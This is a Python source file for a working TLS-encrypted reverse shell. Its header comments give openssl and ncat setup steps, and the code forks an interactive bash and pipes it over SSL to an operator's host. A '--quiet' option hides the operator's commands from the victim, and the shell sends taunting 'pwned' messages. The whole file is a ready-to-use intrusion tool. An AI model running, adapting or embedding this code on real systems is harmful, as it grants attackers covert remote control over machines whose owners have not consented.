# To generate server certificate:
#   $ openssl req -x509 -nodes -sha256 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650
# Give cert.pem to client
# Then server runs: (choose your own port number)
#   $ ncat -nvlp <port> --ssl-cert cert.pem --ssl-key key.pem
# Client runs:
#   $ python3 secure-reverse-shell.py <server> <port> --cert cert.pem

import os, sys, socket, select, time, signal, ssl, argparse

bufsize = 4096

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
parser.add_argument('--cert', action='store', required=True, metavar='certfile')
parser.add_argument('--quiet', action='store_true',
                    help="Hide your operations. Otherwise client can see each command you do to their machine. "
                         "Turn this on for a more traditional reverse shell.")
args = parser.parse_args()

host = args.host
port = args.port
cert = args.cert
quiet = args.quiet

toshell_read, toshell_write = os.pipe()
fromshell_read, fromshell_write = os.pipe()

pid = os.fork()
if pid < 0:
    raise RuntimeError("Fork failed!")
if pid == 0:
    # child process
    cmd = ['/bin/bash', '-i']

    os.dup2(toshell_read, sys.stdin.fileno())
    os.dup2(fromshell_write, sys.stdout.fileno())
    os.dup2(fromshell_write, sys.stderr.fileno())

    os.execvp(cmd[0], cmd)
else:
    # parent process
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.load_verify_locations(cert)
    with socket.socket() as sock:
        sock.settimeout(10)
        sock.connect((host, port))
        sock.settimeout(None)
        with ctx.wrap_socket(sock) as ssock:
            sockfd = ssock.fileno()
            ssock.send(b"\nHello, Master~! I'm pwned~\xE2\x99\xA1\n\n")
            data = os.read(fromshell_read, bufsize)
            ssock.send(data)
            while True:
                try:
                    rlist, wlist, xlist = select.select([fromshell_read, sockfd], [], [], 1)
                    for fd in rlist:
                        if fd == fromshell_read:
                            data = os.read(fd, bufsize)
                            ssock.send(data)
                            if not quiet:
                                try:
                                    sys.stdout.write(data.decode())
                                except:
                                    pass
                        elif fd == sockfd:
                            data = ssock.recv(bufsize)
                            if not data:
                                # connection closed
                                os.kill(pid, signal.SIGKILL)
                            else:
                                os.write(toshell_write, data)
                                if not quiet:
                                    try:
                                        sys.stdout.write(data.decode())
                                    except:
                                        pass
                    childpid, status = os.waitpid(pid, os.WNOHANG)
                    if childpid > 0:
                        if not quiet:
                            print('Shell exit: signal=%d status=%d' % (status & 0xff, status >> 8))
                        break
                except KeyboardInterrupt:
                    continue
            ssock.send(b'Itterasshai, goshujin-sama~\xE2\x99\xA1\n')
            ssock.close()
